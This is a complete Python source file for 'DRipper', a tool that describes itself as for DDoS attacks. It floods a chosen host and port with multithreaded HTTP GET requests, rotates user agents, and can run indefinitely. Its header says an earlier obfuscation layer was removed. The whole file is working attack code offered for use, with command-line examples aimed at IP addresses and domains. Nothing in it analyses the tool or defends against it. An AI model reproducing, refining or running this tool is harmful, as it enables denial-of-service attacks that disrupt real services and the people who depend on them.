#!/usr/bin/env python3
"""
DRipper - DDoS Attack Tool
Python 3.13 Compatible Version (PyArmor protection removed)
"""

import sys
import argparse
import socket
import threading
import time
import random
from typing import Optional

class DRipperAttack:
    """Main DDoS attack handler"""
    
    def __init__(self, target: str, threads: int = 8, duration: int = None):
        self.target = target
        self.threads = threads
        self.duration = duration if duration else float('inf')  # Run forever if not specified
        self.running = True
        self.packets_sent = 0
        self.user_agents = self._load_user_agents()
    
    def _load_user_agents(self) -> list:
        """Load User-Agents from ua.txt file"""
        try:
            with open('ua.txt', 'r') as f:
                user_agents = [line.strip() for line in f.readlines() if line.strip()]
            return user_agents if user_agents else ['Mozilla/5.0']
        except FileNotFoundError:
            print("Warning: ua.txt not found, using default User-Agent")
            return ['Mozilla/5.0']
        
    def parse_target(self) -> tuple:
        """Parse target address into host (IP or domain) and port"""
        try:
            host, port = self.target.split(':')
            return host, int(port)
        except ValueError:
            print(f"Error: Invalid target format. Use HOST:PORT (e.g., 192.168.1.1:80 or example.com:80)")
            sys.exit(1)
    
    def attack_worker(self):
        """Worker thread function to flood HTTP requests (raw socket - faster)"""
        host, port = self.parse_target()
        
        counter = 0
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)  # Shorter timeout
                sock.connect((host, port))
                
                # Rapid-fire HTTP requests (non-blocking)
                for i in range(1000):  # Increased requests per connection
                    if not self.running:
                        break
                    
                    random_ua = random.choice(self.user_agents)
                    host_header = f"{host}:{port}" if port not in (80, 443) else host
                    http_payload = (
                        f"GET /?q={counter} HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"User-Agent: {random_ua}\r\n"
                        f"Accept: */*\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Connection: close\r\n"
                        f"Accept-Language: en-US,en;q=0.9\r\n"
                        f"Referer: https://{host_header}/\r\n"
                        f"Sec-Fetch-Site: cross-site\r\n"
                        f"Sec-Fetch-Mode: navigate\r\n"
                        f"Sec-Fetch-Dest: iframe\r\n"
                        f"\r\n"
                    ).encode()
                    
                    try:
                        sock.sendall(http_payload)
                        counter += 1
                    except:
                        break
                    
                    self.packets_sent += 1
                
                sock.close()
            except Exception as e:
                pass
    
    def start(self):
        """Start the attack"""
        print(f"[+] DRipper Attack Started")
        print(f"[*] Target: {self.target}")
        print(f"[*] Threads: {self.threads}")
        if self.duration == float('inf'):
            print(f"[*] Duration: Infinite (press Ctrl+C to stop)")
        else:
            print(f"[*] Duration: {self.duration}s")
        print(f"[*] Starting attack...\n")
        
        threads = []
        start_time = time.time()
        
        # Create and start worker threads
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Monitor attack progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = int(time.time() - start_time)
                print(f"[*] Elapsed: {elapsed}s | Packets: {self.packets_sent}", end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user (Ctrl+C)")
        finally:
            self.running = False
            for t in threads:
                t.join(timeout=1)
        
        print(f"[+] Attack stopped")
        print(f"[*] Total packets sent: {self.packets_sent}")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='DRipper - DDoS Attack Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ddos.py -s 192.168.8.13:80 -t 8
  python ddos.py -s example.com:443 -t 16 -d 120
        """
    )
    
    parser.add_argument('-s', '--server', required=True, 
                        help='Target server (IP:PORT)')
    parser.add_argument('-t', '--threads', type=int, default=8,
                        help='Number of attack threads (default: 8)')
    parser.add_argument('-d', '--duration', type=int, default=None,
                        help='Attack duration in seconds (default: infinite, until Ctrl+C)')
    
    args = parser.parse_args()
    
    # Create and start attack
    attack = DRipperAttack(args.server, args.threads, args.duration)
    attack.start()

if __name__ == '__main__':
    main()
